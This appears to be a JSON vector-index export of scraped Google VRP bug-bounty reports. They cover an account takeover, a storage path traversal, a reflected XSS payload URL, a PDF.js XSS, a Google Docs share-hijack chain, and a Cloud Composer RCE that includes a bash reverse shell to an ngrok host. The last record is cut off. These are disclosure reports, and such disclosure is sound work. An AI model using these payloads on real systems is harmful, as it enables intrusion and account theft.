"{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "70955932-2296-4f0b-9e1e-a9f2f24e83ae": {"__data__": {"id_": "70955932-2296-4f0b-9e1e-a9f2f24e83ae", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_128222.txt", "file_name": "20250408_175638_128222.txt", "file_type": "text/plain", "file_size": 2150, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "baf4e2dc-007b-47eb-8f06-6b517daa50e4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_128222.txt", "file_name": "20250408_175638_128222.txt", "file_type": "text/plain", "file_size": 2150, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "98a01c991b67e344f316a4069dabc47e763b7caa35f485fdb0baa232fa2b05b1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAccount Takeover via Email Parameter Exploit on Waymo Careers Portal\r\nReported by:\r\nMuhammad Al-Haqbani (Shakbany)\r\nGoogle VRP\r\ntriaged\r\n18:37 | Aug 6, 2024\r\naccepted\r\n18:40 | Aug 6, 2024\r\nfixed\r\n04:38 | Oct 26, 2024\r\nreward decided\r\n$500\r\nSummary:\r\nAccount Takeover via Email Parameter Exploit on Waymo Careers Portal\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://careers.withwaymo.com/candidate-settings-page\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nThis report details a critical security vulnerability discovered on the Waymo Careers portal (\r\nhttps://careers.withwaymo.com/candidate-settings-page\r\n). The vulnerability allows unauthorized access to any user account by manipulating the email parameter while leaving the name field blank. This issue poses significant risks including unauthorized data access, account manipulation, and potential identity theft.\r\nThe vulnerability is present on the Waymo Careers portal's candidate settings page. By inputting an email address and leaving the name field blank, an attacker can gain unauthorized access to the account associated with the entered email address.\r\nPoC:\r\ngo to\r\nhttps://careers.withwaymo.com/candidate-settings-page\r\nenter the email you want to Takeover it\r\nLeave the name blank\r\nClick Continue\r\nWow, I was able to log into the account and also edit and see all the information\r\nsee the video:\r\nhttps://drive.google.com/file/d/1ga0gB7qrED5axp6lSqQS0OFNmqyAMLlb/view?usp=sharing\r\nAttack scenario\r\nHigh: Unauthorized access to user accounts can lead to significant data breaches and potential identity theft.\r\nReputation Damage: Exploitation of this vulnerability can severely damage Waymo's reputation and trust with its users.\r\nCompliance Issues: Violations of data protection regulations such as GDPR or CCPA\r\nImplement proper authentication checks to ensure that both the email and name fields are validated before granting access.\r\nUtilize multi-factor authentication (MFA) to enhance security for user accounts.\r\nRegularly audit and test authentication mechanisms to prevent similar vulnerabilities\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2134, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a979ac51-a40c-4c11-9120-5c4156a56010": {"__data__": {"id_": "a979ac51-a40c-4c11-9120-5c4156a56010", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_159709.txt", "file_name": "20250408_175638_159709.txt", "file_type": "text/plain", "file_size": 2857, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d11b8a0e-9cb0-46be-8851-c9738964ec1c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_159709.txt", "file_name": "20250408_175638_159709.txt", "file_type": "text/plain", "file_size": 2857, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5dfde6d25f976370469321f4b6a30f51d233f29c8a1ca242bdf01910a9055cd4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nBucket traversal in google.cloud.storage.transfer_manager.upload_chunks_concurrently()\r\nReported by:\r\nJakub Domeracki\r\nGoogle VRP\r\ntriaged\r\n23:02 | Jul 15, 2024\r\nsubmitted\r\n03:52 | Jul 19, 2024\r\ntriaged\r\n22:58 | Jul 23, 2024\r\naccepted\r\n04:28 | Jul 25, 2024\r\nfixed\r\n14:55 | Aug 9, 2024\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nBucket traversal in google.cloud.storage.transfer_manager.upload_chunks_concurrently()\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/googleapis/python-storage\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi Team,\r\nThe method\r\ngoogle.cloud.storage.transfer_manager.upload_chunks_concurrently()\r\nis vulnerable to a variant of a path (bucket) traversal.\r\nThis method was added relatively recently and makes use of the\r\nXML API multipart uploads API\r\nhttps://github.com/googleapis/python-storage/releases/tag/v2.11.0\r\nhttps://github.com/googleapis/python-storage/pull/1115/files\r\nIssue stems from the fact that the URL path is not properly validated & the forward slash\r\n/\r\nis not\r\nURL encoded\r\n.\r\nurl = \"{hostname}/{bucket}/{blob}\".format(\r\n        hostname=hostname, bucket=bucket.name, blob=blob.name\r\n    )\r\nhttps://github.com/googleapis/python-storage/blob/d5d3c68a6e5c6f8cefc59892c1ccceaf181ff32d/google/cloud/storage/transfer_manager.py#L1084-L1087\r\nAs a result, if\r\nblob.name\r\nis supplied from user input, then an attacker could make use of the classic\r\ndot-dot-slash\r\ntechnique and upload a file to a bucket unintended by the victim eg.\r\n../bucket/object\r\nPoC based on the official\r\nsample snippet\r\nhttps://drive.google.com/file/d/1_NAaJ-PjQRy7kcEJ4NW7sZ-YdfF79S5g/view?usp=drive_link\r\nAttack scenario\r\nDepending on the IAM permissions granted to the underlying Service Account this could lead to malicious scenarios such as:\r\noverwriting existing files (data & integrity loss)\r\nupload of an object later consumed by an application (config override, XSS etc.)\r\nPatch proposal\r\nI reviewed other methods and it seems that everywhere else the\r\ngoogle.cloud.storage.blob. _quote()\r\nfunction is used to escape/encode special characters.\r\nThe intuitive approach would suggest to reuse this existing method in this instance as well.\r\ndiff --git a/google/cloud/storage/transfer_manager.py b/google/cloud/storage/transfer_manager.py\r\nindex 8190f84..cac3404 100644\r\n--- a/google/cloud/storage/transfer_manager.py\r\n+++ b/google/cloud/storage/transfer_manager.py\r\n@@ -32 +32 @@ from google.cloud.storage import Blob\r\n-from google.cloud.storage.blob import _get_host_name\r\n+from google.cloud.storage.blob import _get_host_name, _quote\r\n@@ -1086 +1086 @@ def upload_chunks_concurrently(\r\n-        hostname=hostname, bucket=bucket.name, blob=blob.name\r\n+        hostname=hostname, bucket=bucket.name, blob=_quote(blob.name)\r\nWith kind regards,\r\n[REDACTED_USERNAME]\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2841, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "76e93eaa-730e-4b1d-b399-1c050fb88d26": {"__data__": {"id_": "76e93eaa-730e-4b1d-b399-1c050fb88d26", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_191160.txt", "file_name": "20250408_175638_191160.txt", "file_type": "text/plain", "file_size": 1807, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d934de01-b1e8-49dc-8cda-a64ca0a23816", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_191160.txt", "file_name": "20250408_175638_191160.txt", "file_type": "text/plain", "file_size": 1807, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0569143289c3408c2211d92beecabca265304b607fbc5d3bbe1b9ae0b19c242a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://idx.google.com/*\r\nReported by:\r\nAnkit Kapoor\r\nGoogle VRP\r\ntriaged\r\n23:32 | Jul 16, 2024\r\nclosed\r\n09:37 | Aug 10, 2024\r\ntriaged\r\n18:53 | Aug 12, 2024\r\naccepted\r\n21:09 | Aug 16, 2024\r\nfixed\r\n19:42 | Nov 21, 2024\r\nSummary: BAC leads to have full access to the workspace with full Privileges even on removing the access via owner workspace\r\nDescription :\r\nHii Team hope you are doing well , while researching on (\r\nhttps://idx.google.com/\r\n) , i was exploring the feature related to the access management where  the owner can share there workspace to anyone via link the perspective user then can perform functions is workspace .\r\nBug:\r\nSo the bug is when the owner remove the access of the perspective user , but the user still have maintaned session of the workspace can perform functions in workspace leading to the full access to the workspace of the owner even on removng the access via owner itslef .\r\nSteps:\r\nNavigate to (\r\nhttps://idx.google.com/\r\n)\r\ncreate a workspace/project .\r\nShare the access via feature on the top right handside , enter the mail you want to give access too.\r\nNow via perspective of the user open the workspace link and try editing the README file for poc .\r\nNow remove the access from the owner .\r\nYou will see that the user still have access to the project and can perform functions like CRUD.\r\n& it is lively updated in the owner's workspace .\r\nPoc:\r\nIf you want the poc , please let me know , i'll create one and will share with you.\r\nThanks\r\nAttack scenario:\r\nAs an attacker he/she easily make changes to the projects as they have CRUD privileges of the project . Without knowing the owner as the owner will think they have succesfully removed the access .\r\nThanks\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1791, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "14bf42d1-c9d5-4608-be53-63bf6906c1a4": {"__data__": {"id_": "14bf42d1-c9d5-4608-be53-63bf6906c1a4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_222631.txt", "file_name": "20250408_175638_222631.txt", "file_type": "text/plain", "file_size": 908, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a3ab5dfc-6ea5-4a4b-95a3-d5fee4953128", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_222631.txt", "file_name": "20250408_175638_222631.txt", "file_type": "text/plain", "file_size": 908, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "83b7b4686d4567f2d48a1f1870900f12d7a6abfcebc1fcb1762d6c4ac0a99fde", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nreflected xss\r\nReported by:\r\nloay morad\r\nGoogle VRP\r\ntriaged\r\n08:11 | Jul 9, 2024\r\naccepted\r\n17:32 | Jul 10, 2024\r\nfixed\r\n11:58 | Aug 17, 2024\r\nSummary:\r\nreflected xss\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://admin.cameyo.com/login/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nReflected XSS Vulnerability Report\r\nSteps to Reproduce:\r\nhttps://admin.cameyo.com/login/command?op=&entityId=%22%20onclick=%22alert(1)%22%20x=%22&esn=\r\nclick to the logo\r\nyou will find alert of value = 1\r\nAttack scenario\r\nA reflected Cross-Site Scripting (XSS) vulnerability was discovered on\r\nhttps://admin.cameyo.com/login/\r\nas it allows an attacker to execute arbitrary JavaScript code within the context of a victim's session, potentially leading to account compromise, data theft, or unauthorized actions on behalf of the user.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 892, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b172502d-aee8-43ca-90c8-6754e6b3ebab": {"__data__": {"id_": "b172502d-aee8-43ca-90c8-6754e6b3ebab", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_269950.txt", "file_name": "20250408_175638_269950.txt", "file_type": "text/plain", "file_size": 1802, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b5e0e9d6-2d0e-485c-9f93-171496c02e66", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_269950.txt", "file_name": "20250408_175638_269950.txt", "file_type": "text/plain", "file_size": 1802, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "1c94027dae5675bce42da4bf2b9f56ebacc2221e0a53ecfa8326ef960cdcd4e0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS on https://app.signalpath.com\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n19:33 | Jul 5, 2024\r\naccepted\r\n21:42 | Jul 5, 2024\r\nfixed\r\n05:43 | Dec 21, 2024\r\nreward decided\r\n$100\r\nSummary:\r\nXSS on\r\nhttps://app.signalpath.com\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://app.signalpath.com/trialpath/assets/pdfjs/web/viewer.html\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nI was asked to create a separate report in\r\nhttps://issuetracker.google.com/u/1/issues/341910000#comment19\r\nThere's a vulnerable version of PDF.js hosted at\r\nhttps://app.signalpath.com/trialpath/assets/pdfjs/web/viewer.html\r\nthat allows for XSS with a custom file. Its CVE-2024-4367\r\nhttps://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/\r\nThere is a same-origin or blob check for the\r\nfile\r\nURL parameter, However the open file feature results in XSS (it also works by drag and drop)\r\nMay also be a feature in\r\nSite CTMS\r\nto upload a document containing the XSS, for example to gain privilege escalation.\r\nTo make the attack less obvious since\r\napp.signalpath.com\r\nhas no embed protection you can make it look like the file upload is for a unrelated site. (May also be a clickjacking concern if you can get past the 3rd party blocking since there are exceptions but depends on the implementation and browser)\r\nAttack scenario\r\nWhile I cant login to the platform\r\nhttps://app.signalpath.com/\r\nsays \"The files in Verily Viewpoint Site CTMS contain confidential patient information belonging to the sender that is legally privileged\" which unlike some disclaimers about stuff being confidential such as the stuff in\r\nSite CTMS Resources\r\nat\r\nhttps://app.signalpath.com/virtual-visits\r\nthis one seems valid.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1786, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7c8ce9ff-43bb-44c1-be05-e80b05d47e9d": {"__data__": {"id_": "7c8ce9ff-43bb-44c1-be05-e80b05d47e9d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.txt", "file_name": "20250408_175640_393408.txt", "file_type": "text/plain", "file_size": 7303, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c102483a-9c35-48a9-addb-9fc42ff504c4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.txt", "file_name": "20250408_175640_393408.txt", "file_type": "text/plain", "file_size": 7303, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "994d13887f3eadf77d272f35794ca4031509431f7e72a8111aecc6d056393206", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "c41fddaf-0cf5-42ca-9980-39bba487978d", "node_type": "1", "metadata": {}, "hash": "7c7edb50eb833d0dd9ae891e8c46b3ebeeb6b8b1a70172095fdc19066f654146", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nA chain of Google Docs flaws leads to one-click Drive folder/file hijack\r\nReported by:\r\nRebane\r\nGoogle VRP\r\ntriaged\r\n03:27 | Jul 2, 2024\r\naccepted\r\n04:33 | Jul 2, 2024\r\nfixed\r\n02:14 | Sep 29, 2024\r\nreward decided\r\n$4,133.70\r\nSummary:\r\nA chain of Google Docs flaws leads to one-click Drive folder/file hijack\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://docs.google.com/\r\nVulnerability type:\r\nOther\r\nDetails\r\nThis vulnerability is a chain of a few different tricks.\r\nGoogle Slides YouTube path traversal\r\nYou can embed YouTube videos in Google Slides. The way it works is that your client provides Slides with a video ID (eg\r\nprzDcQe6n5o\r\n), and it will iframe it as an embed (eg\r\nhttps://www.youtube.com/embed/przDcQe6n5o\r\n).\r\nThis functionality does not validate the video ID, so it's possible to perform a path traversal. For example, using the video ID\r\n../example\r\nwill end up with an iframe at\r\nhttps://www.youtube.com/example\r\n.\r\nYouTube to Google redirect\r\nWe have the ability to visit any youtube.com URL, but it is not particularly useful as most YouTube pages cannot be framed on the docs.google.com origin. However, it turns out that\r\nhttps://www.youtube.com/signin\r\ncan be framed.\r\nThe\r\n/signin\r\npage uses the\r\nnext\r\nquery parameter as the URL to redirect to. From my (limited) testing, it seems like you're only allowed to redirect to\r\n*.youtube.com\r\nURLs.\r\nYouTube has a subdomain at\r\naccounts.youtube.com\r\n, which we can redirect to. This subdomain allows us to do another redirect to certain Google URLs, so we can chain it with the\r\n/signin\r\npage to escape YouTube and redirect to other domains.\r\nHere's an example of how to construct such a redirect step-by-step:\r\nhttps://docs.google.com\r\nhttps://accounts.youtube.com/accounts/SetSID?ssdc=1&sidt=&continue=https%3A%2F%2Fdocs.google.com&tcc=1&dbus=EE\r\nhttps://www.youtube.com/signin?action_handle_signin=true&app=desktop&hl=en&next=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1%26sidt%3D%26continue%3Dhttps%3A%2F%2Fdocs.google.com%26tcc%3D1%26dbus%3DEE&feature=passive&hl=en\r\nThe included\r\ngenerate_embed_url.py\r\nscript will automatically do this for you.\r\nDocs Drive preview\r\nSince we can now iframe any\r\ndocs.google.com\r\nURL\r\nas same-origin\r\n, we can bypass the usual restrictions of iframing Docs. The document pages themselves disable the sharing option for iframed documents, and the Docs home page doesn't provide anything too useful.\r\nMost old Google Drive file/folder links now redirect to\r\ndrive.google.com\r\nand cannot be iframed, but I found a URL that still works:\r\ndocs.google.com/file/d/{ID}/edit\r\n. Framing this URL does not disable the share button, so we can use it in a frame.\r\nShare param\r\nIt'd be fairly challening to trick someone into clicking the Share button and typing in your e-mail. It turns out there's a query parameter that will do this automatically:\r\n.../edit?userstoinvite=user@example.org\r\n. This will pop up a pre-filled share dialog on load, so all the target needs to do is click a button labeled \"Send\".\r\nRedirect block bypass\r\nCombining the previous two steps, we will have a URL that looks like this:\r\ndocs.google.com/file/u/example/edit?userstoinvite=\r\nuser@example.org\r\nIf we try to use this URL in our iframe redirect we will end up with a page that says permission denied. This is because we're navigating from\r\naccounts.youtube.com\r\nto\r\ndocs.google.com\r\n, and the file page does not like this redirect.\r\nWe need a\r\ndocs.google.com\r\nto\r\ndocs.google.com\r\nredirect instead. For this we can use an old Docs URLs format designed for Google Workspaces:\r\ndocs.google.com/a/example.org/file...\r\n. This URL format is no longer used, so Docs redirects us to the same URL with the\r\n/a/...\r\npart removed, making the file page happy.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3796, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c41fddaf-0cf5-42ca-9980-39bba487978d": {"__data__": {"id_": "c41fddaf-0cf5-42ca-9980-39bba487978d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.txt", "file_name": "20250408_175640_393408.txt", "file_type": "text/plain", "file_size": 7303, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c102483a-9c35-48a9-addb-9fc42ff504c4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.txt", "file_name": "20250408_175640_393408.txt", "file_type": "text/plain", "file_size": 7303, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "994d13887f3eadf77d272f35794ca4031509431f7e72a8111aecc6d056393206", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "7c8ce9ff-43bb-44c1-be05-e80b05d47e9d", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.txt", "file_name": "20250408_175640_393408.txt", "file_type": "text/plain", "file_size": 7303, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d5ebb7f71b7cd8e32618dc8b754a8c89f9c6d3cebbbf6c8fcf6f611e0854ae97", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "This will pop up a pre-filled share dialog on load, so all the target needs to do is click a button labeled \"Send\".\r\nRedirect block bypass\r\nCombining the previous two steps, we will have a URL that looks like this:\r\ndocs.google.com/file/u/example/edit?userstoinvite=\r\nuser@example.org\r\nIf we try to use this URL in our iframe redirect we will end up with a page that says permission denied. This is because we're navigating from\r\naccounts.youtube.com\r\nto\r\ndocs.google.com\r\n, and the file page does not like this redirect.\r\nWe need a\r\ndocs.google.com\r\nto\r\ndocs.google.com\r\nredirect instead. For this we can use an old Docs URLs format designed for Google Workspaces:\r\ndocs.google.com/a/example.org/file...\r\n. This URL format is no longer used, so Docs redirects us to the same URL with the\r\n/a/...\r\npart removed, making the file page happy.\r\nSpoofing the dialog\r\nWe can combine all of the previous concepts to add the share dialog to our presentation, but it's still fairly obvious to the user what clicking \"Send\" will do.\r\nWe can however use the same redirect trick to overlay other content on the same slide to mask the dialog. Docs has many features/services we can iframe, I chose\r\n/htmlpresent\r\nfor my demo but there are probably better ways to do it.\r\nIt's also possible to just move the share dialog to the top left of the screen so that only the Send button is visible without having to cover anything up.\r\nWe can also add a slow fade transition to give the iframes more time to load and hide the share dialog pop-up animation.\r\nDelivery\r\nThe attack can be delivered either via the\r\n/present\r\npage, or a share to web URL. In my demo I used the share to web feature, and set it to automatically advance to the next slide after 1ms to play the fade transition without requiring a user-gesture.\r\nBonus\r\nWhile this report demonstrates a specific attack, I believe that iframing of any docs.google.com page as self-origin, and any Google page that allows Docs to frame it, could lead to other vulnerabilities and attack vectors.\r\nFor example, an attacker can load multiple Docs picker URLs for various Google services (eg Docs, Photos, Drive) in layered (hidden) iframes, and then trick the target into pressing CTRL+P and saving a PDF of it all. Such an attack is rather powerful and requires no previous knowledge (no need to know IDs) but is a bit harder to pull off (social engineering wise).\r\nAnother possibility is loading a vulnerable frame with specific query parameters to reach XSS. I was not able to find such a frame and params combination in my research, but there is\r\na lot\r\nof attack surface out there since a lot of JS/gapi widgets allow framing on docs.google.com.\r\nRepro\r\nTo set up a basic version of this attack:\r\nEdit the\r\ngenerate_embed_url.py\r\nscript to include the targeted file/folder ID in\r\nTARGET_ID\r\n, and your (attacker's) e-mail in\r\nTARGET_EMAIL\r\n. Run the script and keep note of the URL following \"Embed with:\" in the output.\r\nCreate a new Google Slides presentation and add any YouTube video.\r\nSet the video to start automatically, and muted.\r\nDuplicate the video and use a HTTP proxy to change the video ID to the URL from step 1.\r\n(optional) Follow the same process with the script edited for other URLs to cover up the Share dialog and spoof it.\r\nPublish the presentation to web and send the URL to the target. Once they click the \"Send\" button you'll gain\r\nEditor\r\naccess to the file/folder at the ID.\r\nI've included a\r\nsetup.webm\r\nvideo that goes through the above steps, as well as a\r\ndemo.webm\r\nvideo that just shows an example of what an actual attack with spoofing could look like.\r\nI'd love to share my research with the world once the vulnerability is patched, either on\r\nmy blog\r\nor as a YouTube video. Feel free to let me know if you have any thoughts or questions around that.\r\nAttack scenario\r\nThis vulnerability can be used by an attacker who knows the ID (or URL) of a private\r\nGoogle Drive folder\r\n,\r\nfile\r\n, or\r\nGoogle Docs document\r\n.\r\nThe attacker has to convince the target to open a crafted\r\ndocs.google.com\r\nlink and click on a button labeled \"Send\" on it. The attacker has a lot of control over how the button is presented and can convincingly mask/spoof it.\r\nThe attacker gains read/write (\"Editor\") access to the targeted folder, file, or document.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 2957, "end_char_idx": 7287, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c835a5f4-001a-4664-92d3-0a61980be2e9": {"__data__": {"id_": "c835a5f4-001a-4664-92d3-0a61980be2e9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_426701.txt", "file_name": "20250408_175640_426701.txt", "file_type": "text/plain", "file_size": 2645, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6536a3a7-0601-46f8-9618-3b748bc1f657", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_426701.txt", "file_name": "20250408_175640_426701.txt", "file_type": "text/plain", "file_size": 2645, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cc5c986d6eec0e4de86b5111d5edcfafd4f60b89f5ebd4bab894946540facb7f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nComposer RCE inside dag processor, triggerer, worker and webserver machines\r\nGoogle VRP\r\ntriaged\r\n23:08 | Jun 24, 2024\r\naccepted\r\n01:50 | Jul 4, 2024\r\nfixed\r\n19:20 | Aug 15, 2024\r\nSummary:\r\nComposer RCE inside dag processor, triggerer, worker and webserver machines\r\nProgram:\r\nGoogle VRP\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nIt's possible to create a composer environment with environment variables such as:\r\nPYTHONWARNINGS=\"all:0:antigravity.x:0:0\" \r\nBROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19980 0>&1' & #%s\"\r\nThen, all the machines related to the composer environment will use these environment variables. Which will cause that any python execution will trigger a reverse shell.\r\nAttack scenario\r\nAny user with the permission\r\ncomposer.environments.update\r\nwill be able to update the environment variables of a composer environment.\r\nThe attacker will gain access to (at least) 4 composer machines:\r\nDag processor\r\nTriggerer\r\nWorker\r\nWebserver\r\nThese are machines maintained by GCP that, afaik, the user shouldn't be able to access.\r\nWith this access the user will be in complete control of the Composer (Airflow) environment, being able to access and modify the SAL databases, redis, steal the signing keys...\r\nStealing the signing keys the user will be able to maintain persistence over the airflow platform and escalate privileges.\r\nMoreover, accessing these machines it might be possible that the attacker can have access to restricted places. As I wasn't sure if the user was expected to be able to access these machines, my guess was that he isn't, I didn't investigate further where those machines were located.\r\nFinally, a user only having the\r\ncomposer.environments.update\r\npermission is going to be able to escalate privileges to the SA attached to the composer environment without needing the actAs permission of the Service 